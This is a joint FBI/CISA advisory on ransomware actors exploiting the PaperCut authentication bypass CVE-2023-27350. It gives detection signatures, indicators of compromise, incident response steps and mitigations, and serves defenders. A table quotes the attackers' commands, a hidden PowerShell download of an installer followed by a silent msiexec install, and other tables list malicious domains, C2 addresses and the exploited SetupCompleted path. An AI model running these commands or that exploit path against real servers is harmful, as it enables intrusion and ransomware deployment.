{
  "markdown": "\nSUMMARY\nThe Federal Bureau of Investigation (FBI) and Cybersecurity and Infrastructure Security Agency (CISA) are releasing this joint Cybersecurity Advisory (CSA) in response to the active exploitation of CVE-2023-27350. This vulnerability occurs in certain versions of PaperCut NG and PaperCut MF and enables an unauthenticated actor to execute malicious code remotely without credentials. PaperCut released a patch in March 2023.\nAccording to FBI observed information, malicious actors exploited CVE-2023-27350 beginning in mid-April 2023 and continuing through the present. In early May 2023, also according to FBI information, a group self-identifying as the Bl00dy Ransomware Gang attempted to exploit vulnerable PaperCut servers against the Education Facilities Subsector.\nThis joint advisory provides detection methods for exploitation of CVE-2023-27350 as well and indicators of compromise (IOCs) associated with Bl00dy Ransomware Gang activity. FBI and CISA strongly encourage users and administrators to immediately apply patches, and workarounds if unable to patch. FBI and CISA especially encourage organizations who did not patch immediately to assume compromise and hunt for malicious activity using the detection signatures in this CSA. If potential compromise is detected, organizations should apply the incident response recommendations included in this CSA.\nDownload the PDF version of this report (653kb):\n\n\nAA23-131A_Malicious_Actors_Exploit_CVE-2023-27350_in_PapercCut_MF_and_NG.pdf\n(PDF,       652.93 KB\n  )\n\n\nFor a downloadable copy of IOCs (55kb), see:\n\n\nAA23-131A.STIX_.XML\n(XML,       54.98 KB\n  )\n\n\nTECHNICAL DETAILS\nVulnerability Overview\nCVE-2023-27350 allows a remote actor to bypass authentication and conduct remote code execution on the following affected installations of PaperCut:[1]\n\nVersion 8.0.0 to 19.2.7\nVersion 20.0.0 to 20.1.6\nVersion 21.0.0 to 21.2.10\nVersion 22.0.0 to 22.0.8\n\nPaperCut servers vulnerable to CVE-2023-27350 implement improper access controls in the SetupCompleted Java class, allowing malicious actors to bypass user authentication and access the server as an administrator. After accessing the server, actors can leverage existing PaperCut software features for remote code execution (RCE). There are currently two publicly known proofs of concept for achieving RCE in vulnerable PaperCut software:\n\nUsing the print scripting interface to execute shell commands.\nUsing the User/Group Sync interface to execute a living-off-the-land-style attack.\n\nFBI and CISA note that actors may develop other methods for RCE.\nThe PaperCut server process pc-app.exe runs with SYSTEM- or root-level privileges. When the software is exploited to execute other processes such as cmd.exe or powershell.exe, these child processes are created with the same privileges. Commands supplied with the execution of these processes will also run with the same privileges. As a result, a wide range of post-exploitation activity is possible following initial access and compromise.\nThis CVE was added to CISA\u2019s Known Exploited Vulnerabilities (KEV) Catalog on April 21, 2023.\nThreat Actor Activity\nEducation Facilities Subsector entities maintained approximately 68% of exposed, but not necessarily vulnerable, U.S.-based PaperCut servers. In early May 2023, according to FBI information, the Bl00dy Ransomware Gang gained access to victim networks across the Education Facilities Subsector where PaperCut servers vulnerable to CVE-2023-27350 were exposed to the internet. Ultimately, some of these operations led to data exfiltration and encryption of victim systems. The Bl00dy Ransomware Gang left ransom notes on victim systems demanding payment in exchange for decryption of encrypted files (see Figure 1).\n\n \n\nFigure 1: Example Bl00dy Gang Ransomware Note\n\nAccording to FBI information, legitimate remote management and maintenance (RMM) software was downloaded and executed on victim systems via commands issued through PaperCut\u2019s print scripting interface. External network communications through Tor and/or other proxies from inside victim networks helped Bl00dy Gang ransomware actors mask their malicious network traffic. The FBI also identified information relating to the download and execution of command and control (C2) malware such as DiceLoader, TrueBot, and Cobalt Strike Beacons, although it is unclear at which stage in the attack these tools were executed.\nDETECTION METHODS\nNetwork defenders should focus detection efforts on three key areas:\n\nNetwork traffic signatures \u2013 Look for network traffic attempting to access the SetupCompleted page of an exposed and vulnerable PaperCut server.\nSystem monitoring \u2013 Look for child processes spawned from a PaperCut server\u2019s pc-app.exe process.\nServer settings and log files \u2013 Look for evidence of malicious activity in PaperCut server settings and log files.\n\nNetwork Traffic Signatures\nTo exploit CVE-2023-27350, a malicious actor must first visit the SetupCompleted page of the intended target, which will provide the adversary with authentication to the targeted PaperCut server. Deploy the following Emerging Threat Suricata signatures to detect when GET requests are sent to the SetupCompleted page. (Be careful of improperly formatted double-quotation marks if copying and pasting signatures from this advisory.)\nNote that some of the techniques identified in this section can affect the availability or stability of a system. Defenders should follow organizational policies and incident response best practices to minimize the risk to operations while threat hunting.\u00a0\nalert http any any -> $HOME_NET any (\\\u00a0 msg:\"ET EXPLOIT PaperCut MF/NG SetupCompleted Authentication Bypass (CVE-2023-27350)\"; \\\u00a0 flow:established,to_server; \\\u00a0 http.method; content:\"GET\"; \\\u00a0 http.uri; content:\"/app?service=page/SetupCompleted\"; bsize:32; fast_pattern; \\\u00a0 reference:cve,2023-27350; \\\u00a0 classtype:attempted-admin; \\\nalert http any any -> $HOME_NET any (msg:\"ET EXPLOIT PaperCut MF/NG SetupCompleted Authentication Bypass (CVE-2023-27350)\"; flow:established,to_server; http.method; content:\"GET\"; http.uri; content:\"page/SetupCompleted\"; fast_pattern; reference:url,www.huntress.com/blog/critical-vulnerabilities-in-papercut-print-management-software; reference:cve,2023-27350; classtype:attempted-admin; metadata:attack_target Server, cve CVE_2023_27350, deployment Perimeter, deployment Internal, deployment SSLDecrypt, former_category EXPLOIT, performance_impact Low, confidence High, signature_severity Major, updated_at 2023_05_05;)\nNote that these signatures and other rule-based detections, including YARA rules, may fail to detect more advanced iterations of CVE-2023-27350 exploits. Actors are known to adapt exploits to circumvent rule-based detections formulated for the original iterations of exploits observed in the wild. For example, the first rule above detected some of the first known exploits of CVE-2023-27350, but a slight modification of the exploit\u2019s GET request can evade that rule. The second rule was designed to detect a broader range of activity than the first rule.\nThe following additional Emerging Threat Suricata signatures are designed to detect Domain Name System (DNS) lookups of known malicious domains associated with recent PaperCut exploitation:\nalert dns $HOME_NET any -> any any (msg:\"ET TROJAN Possible PaperCut MF/NG Post Exploitation Domain in DNS Lookup (windowcsupdates .com)\"; dns_query; content:\"windowcsupdates.com\"; nocase; isdataat:!1,relative; pcre:\"/(?:^|\\.)windowcsupdates\\.com$/\"; reference:url,www.huntress.com/blog/critical-vulnerabilities-in-papercut-print-management-software; classtype:trojan-activity; metadata:affected_product Windows_XP_Vista_7_8_10_Server_32_64_Bit, attack_target Client_Endpoint, deployment Perimeter, former_category MALWARE, performance_impact Low, signature_severity Major, updated_at 2023_04_21;)\nalert dns $HOME_NET any -> any any (msg:\"ET ATTACK_RESPONSE Possible PaperCut MF/NG Post Exploitation Domain in DNS Lookup (anydeskupdate .com)\"; dns_query; content:\"anydeskupdate.com\"; nocase; isdataat:!1,relative; pcre:\"/(?:^|\\.)anydeskupdate\\.com$/\"; reference:url,www.huntress.com/blog/critical-vulnerabilities-in-papercut-print-management-software; classtype:trojan-activity; metadata:affected_product Windows_XP_Vista_7_8_10_Server_32_64_Bit, attack_target Client_Endpoint, deployment Perimeter, former_category MALWARE, performance_impact Low, signature_severity Major, updated_at 2023_04_21;)\nalert dns $HOME_NET any -> any any (msg:\"ET TROJAN Possible PaperCut MF/NG Post Exploitation Domain in DNS Lookup (anydeskupdates .com)\"; dns_query; content:\"anydeskupdates.com\"; nocase; isdataat:!1,relative; pcre:\"/(?:^|\\.)anydeskupdates\\.com$/\"; reference:url,www.huntress.com/blog/critical-vulnerabilities-in-papercut-print-management-software; classtype:trojan-activity; metadata:affected_product Windows_XP_Vista_7_8_10_Server_32_64_Bit, attack_target Client_Endpoint, deployment Perimeter, former_category MALWARE, performance_impact Low, signature_severity Major, updated_at 2023_04_21;)\nalert dns $HOME_NET any -> any any (msg:\"ET TROJAN Possible PaperCut MF/NG Post Exploitation Domain in DNS Lookup (windowservicecemter .com)\"; dns_query; content:\"windowservicecemter.com\"; nocase; isdataat:!1,relative; pcre:\"/(?:^|\\.)windowservicecemter\\.com$/\"; reference:url,www.huntress.com/blog/critical-vulnerabilities-in-papercut-print-management-software; classtype:trojan-activity; metadata:affected_product Windows_XP_Vista_7_8_10_Server_32_64_Bit, attack_target Client_Endpoint, deployment Perimeter, former_category MALWARE, performance_impact Low, signature_severity Major, updated_at 2023_04_21;)\nalert dns $HOME_NET any -> any any (msg:\"ET ATTACK_RESPONSE Possible PaperCut MF/NG Post Exploitation Domain in DNS Lookup (winserverupdates .com)\"; dns_query; content:\"winserverupdates.com\"; nocase; isdataat:!1,relative; pcre:\"/(?:^|\\.)winserverupdates\\.com$/\"; reference:url,www.huntress.com/blog/critical-vulnerabilities-in-papercut-print-management-software; classtype:trojan-activity; metadata:affected_product Windows_XP_Vista_7_8_10_Server_32_64_Bit, attack_target Client_Endpoint, deployment Perimeter, former_category MALWARE, performance_impact Low, signature_severity Major, updated_at 2023_04_21;)\nalert dns $HOME_NET any -> any any (msg:\"ET TROJAN Possible PaperCut MF/NG Post Exploitation Domain in DNS Lookup (netviewremote .com)\"; dns_query; content:\"netviewremote.com\"; nocase; isdataat:!1,relative; pcre:\"/(?:^|\\.)netviewremote\\.com$/\"; reference:url,www.huntress.com/blog/critical-vulnerabilities-in-papercut-print-management-software; classtype:trojan-activity; metadata:affected_product Windows_XP_Vista_7_8_10_Server_32_64_Bit, attack_target Client_Endpoint, deployment Perimeter, former_category MALWARE, performance_impact Low, signature_severity Major, updated_at 2023_04_21;)\nalert dns $HOME_NET any -> any any (msg:\"ET TROJAN Possible PaperCut MF/NG Post Exploitation Domain in DNS Lookup (updateservicecenter .com)\"; dns_query; content:\"updateservicecenter.com\"; nocase; isdataat:!1,relative; pcre:\"/(?:^|\\.)updateservicecenter\\.com$/\"; reference:url,www.huntress.com/blog/critical-vulnerabilities-in-papercut-print-management-software; classtype:trojan-activity; metadata:affected_product Windows_XP_Vista_7_8_10_Server_32_64_Bit, attack_target Client_Endpoint, deployment Perimeter, former_category MALWARE, performance_impact Low, signature_severity Major, updated_at 2023_04_21;)\nalert dns $HOME_NET any -> any any (msg:\"ET TROJAN Possible PaperCut MF/NG Post Exploitation Domain in DNS Lookup (windowservicecenter .com)\"; dns_query; content:\"windowservicecenter.com\"; nocase; isdataat:!1,relative; pcre:\"/(?:^|\\.)windowservicecenter\\.com$/\"; reference:url,www.huntress.com/blog/critical-vulnerabilities-in-papercut-print-management-software; classtype:trojan-activity; metadata:affected_product Windows_XP_Vista_7_8_10_Server_32_64_Bit, attack_target Client_Endpoint, deployment Perimeter, former_category MALWARE, performance_impact Low, signature_severity Major, updated_at 2023_04_21;)\nalert dns $HOME_NET any -> any any (msg:\"ET TROJAN Possible PaperCut MF/NG Post Exploitation Domain in DNS Lookup (windowservicecentar .com)\"; dns_query; content:\"windowservicecentar.com\"; nocase; isdataat:!1,relative; pcre:\"/(?:^|\\.)windowservicecentar\\.com$/\"; reference:url,www.huntress.com/blog/critical-vulnerabilities-in-papercut-print-management-software; classtype:trojan-activity; metadata:affected_product Windows_XP_Vista_7_8_10_Server_32_64_Bit, attack_target Client_Endpoint, deployment Perimeter, former_category ATTACK_RESPONSE, performance_impact Low, signature_severity Major, updated_at 2023_04_21;)\nNote that these signatures may also not work if the actor modified activity to evade detection by known rules.\nSystem Monitoring\nA child process is spawned under pc-app.exe when the vulnerable PaperCut software is used to execute another process, which is the PaperCut server process. Malicious activity against PaperCut servers in mid-April used the RCE to supply commands to a cmd.exe or powershell.exe child process, which were then used to conduct further network exploitation. The following YARA rule may detect malicious activity[2].\ntitle: PaperCut MF/NG Vulnerability\u00a0authors: Huntress DE&TH Teamdescription: Detects suspicious code execution from vulnerable PaperCut versions MF and NG\u00a0logsource:\u00a0 category: process_creation\u00a0\u00a0 product: windows\u00a0detection:\u00a0\u00a0 selection:\u00a0\u00a0 \u00a0 ParentImage|endswith: \u201c\\\\pc-app.exe\u201d\u00a0\u00a0 \u00a0 Image|endswith: \u00a0\u00a0 \u00a0 \u00a0 - \u201c\\\\cmd.exe\u201d\u00a0\u00a0 \u00a0 \u00a0 - \u201c\\\\powershell.exe\u201d\u00a0\u00a0 condition: selection\u00a0level: high\u00a0falsepositives: \u00a0\u00a0 \u00a0\u00a0 - Expected admin activity\nMore advanced versions of the exploit can drop a backdoor executable, use living-off-the-land binaries, or attempt to evade the above YARA rule by spawning an additional child process in-between pc-app.exe and a command-line interpreter.\nServer Settings and Log Files\nNetwork defenders may be able to identify suspicious activity by reviewing the PaperCut server options to identify unfamiliar print scripts or User/Group Sync settings.\nIf the PaperCut Application Server logs have debug mode enabled, lines containing SetupCompleted at a time not correlating with the server installation or upgrade may be indicative of a compromise. Server logs can be found in [app-path]/server/logs/*.* where server.log is normally the most recent log file.Any of the following server log entries may be indicative of a compromise:\n\nUser \"admin\" updated the config key \u201cprint.script.sandboxed\u201d\nUser \"admin\" updated the config key \u201cdevice.script.sandboxed\u201d\nAdmin user \"admin\" modified the print script on printer\nUser/Group Sync settings changed by \"admin\"\n\nIndicators of Compromise\nSee Table 1 through Table 6 for IOCs obtained from FBI investigations and open-source information as of early May 2023.\n\nTable 1: Bl00dy Gang Ransomware Email Addresses\n\n\nEmail Addresses\n\n\ndecrypt.support@privyonline[.]com\n\n\nfimaribahundqf@gmx[.]com\n\n\nmain-office@data-highstream[.]com\n\n\nprepalkeinuc0u@gmx[.]com\n\n\ntpyrcne@onionmail[.]org\n\n\n\n\u00a0\n\nTable 2: Bl00dy Gang Ransomware Tox ID\n\n\nTox ID\n\n\nE3213A199CDA7618AC22486EFECBD9F8E049AC36094D56AC1BFBE67EB9C3CF2352CAE9EBD35F\n\n\n\n\u00a0\n\nTable 3: Bl00dy Gang Ransomware IP addresses\n\n\nIP Address\nPort\n>Date\nDescription\n\n\n102.130.112[.]157\n-\nApril 2023\nN/A\n\n\n172.106.112[.]46\n-\nApril 2023\nResolves to\u00a0Tor node. Network communications with nethelper.exe.\n\n\n176.97.76[.]163\n-\nApril 2023\nResolves to datacenter Tor node.\n\n\n\n192.160.102[.]164\n\u00a0\n\n\u00a0\nApril 2023\nResolves to Tor node. Network communications with nethelper.exe.\n\n\n194.87.82[.]7\n-\nApril 2023\nTrueBot C2. DiceLoader malware.\n\n\n195.123.246[.]20\n-\nApril 2023\nTrueBot C2. DiceLoader malware.\n\n\n\n198.50.191[.]95\n\u00a0\n\n\u00a0\nApril 2023\nResolves to\u00a0Tor node. Network communications with nethelper.exe.\n\n\n206.197.244[.]75\n>443\nApril 2023\nN/A\n\n\n\n216.122.175[.]114\n\u00a0\n\n\u00a0\nApril 2023\nOutbound communications from powershell.exe.\n\n\n46.4.20[.]30\n\u00a0\nApril 2023\nResolves to Tor node.\u00a0Network communications with nethelper.exe.\n\n\n5.188.206[.]14\n-\nApril 2023\nN/A\n\n\n5.8.18[.]233\n-\nApril 2023\nCobalt Strike C2.\n\n\n5.8.18[.]240\n-\nApril 2023\nCobalt Strike C2.\n\n\n80.94.95[.]103\n-\nApril 2023\nN/A\n\n\n89.105.216[.]106\n443\nApril 2023\nResolves to Tor node. Network communications with nethelper.exe.\n\n\n92.118.36[.]199\n9100, 443\nApril 2023\nOutbound communications from svchost.exe.\n\n\n\nhttp://192.184.35[.]216:443/\n4591187629.exe\n\n-\nApril 2023\nFile 4591187629.exe is possibly cryptominer malware.\n\n\n\n\u00a0\n\nTable 4: Bl00dy Gang Ransomware Domains\n\n\nMalicious Domain\nDescription\n\n\nanydeskupdate[.]com\nN/A\n\n\nanydeskupdates[.]com\nN/A\n\n\nber6vjyb[.]com\nAssociated with TrueBot C2\n\n\nnetviewremote[.]com\nN/A\n\n\nstudy.abroad[.]ge\nAssociated with Cobalt Strike Beacon\n\n\nupd343.winserverupdates[.]com\nAssociated with Cobalt Strike Beacon\n\n\nupd488.windowservicecemter[.]com\nAssociated with TrueBot payload\n\n\nupd488.windowservicecemter[.]com/download/update.dll\nFile: Cobalt Strike Beacon\n\n\nupdateservicecenter[.]com\nN/A\n\n\nwindowcsupdates[.]com\nN/A\n\n\nwindowservicecemter[.]com\nAssociated with TrueBot payload\n\n\nwindowservicecentar[.]com\nN/A\n\n\nwindowservicecenter[.]com\nN/A\n\n\nwinserverupdates[.]com\nN/A\n\n\nwinserverupdates[.]com\nN/A\n\n\n\n\u00a0\n\nTable 5: Bl00dy Gang Ransomware Known Commands\n\n\nCommand\nDescription\n\n\ncmd /c \u201cpowershell.exe -nop -w hidden\nLaunches powershell.exe in a hidden window without loading the user's PowerShell profile.\n\n\n\nInvoke-WebRequest \u2018<url>/setup.msi\u2019\n\u00a0-OutFile \u2018setup.msi\u2019\u2009\u201d\n\nDownloads setup.msi, saving it as setup.msi, in the current PowerShell working directory.\n\n\ncmd /c \u201cmsiexec /i setup.msi /qn\u00a0 IntegratorLogin=<email_address> CompanyId=1\u201d\nInstalls legitimate Atera RMM software on the system silently, with the specified email address and company ID properties.\n\n\n\n\u00a0\n\nTable 6: Bl00dy Gang Ransomware Malicious Files\n\n\nFile\nSHA-256\nDescription\n\n\n/windows/system32/config/systemprofile/appdata/roaming/tor/\nN/A\nUnspecified files created in Tor directory\n\n\n/windows/temp/socks.exe\n6bb160ebdc59395882ff322e67e000a22a5c54ac777b6b1f10f1fef381df9c15\nReverse SOCKS5 tunneler with TLS support (see https://github.com/kost/revsocks)\n\n\n/windows/temp/servers.txt\nN/A\nUnspecified content within servers.txt file; likely a list of proxy servers for revsocks(socks.exe)\n\n\nld.txt\nc0f8aeeb2d11c6e751ee87c40ee609aceb1c1036706a5af0d3d78738b6cc4125\nTrueBot malware\n\n\nnethelper.exe\nN/A\nUnknown file used to send outbound communications through Tor\n\n\nupdate.dll\n0ce7c6369c024d497851a482e011ef1528ad270e83995d52213276edbe71403f\nCobalt Strike Beacon\n\n\n\nINCIDENT RESPONSE\nIf compromise is suspected or detected, organizations should:\n\nCreate a backup of the current PaperCut server(s).\nWipe the PaperCut Application Server and/or Site Server and rebuild it.\nRestore the database from a \u201csafe\u201d backup point. Using a backup dated prior to April 2023 would be prudent, given that exploitation\u00a0in-the-wild exploitation began around early April.\nExecute additional security response procedures and carry out best practices around potential compromise.\nReport the compromise to CISA via CISA\u2019s 24/7 Operations Center (report@cisa.gov or 888-282-0870). The FBI encourages recipients of this document to report information concerning suspicious or criminal activity to their local FBI field office or IC3.gov. Regarding specific information that appears in this communication, the context and individual indicators, particularly those of a non-deterministic or ephemeral nature (such as filenames or IP addresses), may not be indicative of a compromise. Indicators should always be evaluated in light of an organization\u2019s complete information security situation.\u00a0\n\nMITIGATIONS\nFBI and CISA recommend organizations:\n\nUpgrade PaperCut to the latest version.\nIf unable to immediately patch, ensure vulnerable PaperCut servers are not accessible over the internet and implement one of the following network controls:\n\nOption 1: External controls: Block all inbound traffic from external IP addresses to the web management portal (port 9191 and 9192 by default).\nOption 2: Internal and external controls: Block all traffic inbound to the web management portal. Note: The server cannot be managed remotely after this step.\n\n\nFollow best cybersecurity practices in your production and enterprise environments, including mandating phishing-resistant multifactor authentication (MFA) for all staff and for all services. For additional best practices, see CISA\u2019s Cross-Sector Cybersecurity Performance Goals (CPGs). The CPGs, developed by CISA and the National Institute of Standards and Technology (NIST), are a prioritized subset of IT and OT security practices that can meaningfully reduce the likelihood and impact of known cyber risks and common TTPs. Because the CPGs are a subset of best practices, CISA and FBI also recommend all organizations implement a comprehensive information security program based on a recognized framework, such as the NIST Cybersecurity Framework (CSF).\n\nACKNOWLEDGMENTS\nThe Multi-State Information Sharing and Analysis Center (MS-ISAC) contributed to this advisory.REFERENCES[1] PaperCut: URGENT | PaperCut MF/NG vulnerability bulletin (March 2023)[2] Huntress: Critical Vulnerabilities in PaperCut Print Management Software\nThis product is provided subject to this\u00a0Notification\u00a0and this\u00a0Privacy & Use\u00a0policy.\n",
  "cves": [
    "CVE-2023-27350"
  ],
  "techniques": [],
  "advisory": "aa23-131a",
  "title": "Malicious Actors Exploit CVE-2023-27350 in PaperCut MF and NG | CISA",
  "source": "cybersecurity-advisories",
  "id": "22264a64feb8c1f82e6557420615f7f4b6d7e4f809cf61d88f498591c21508f3"
}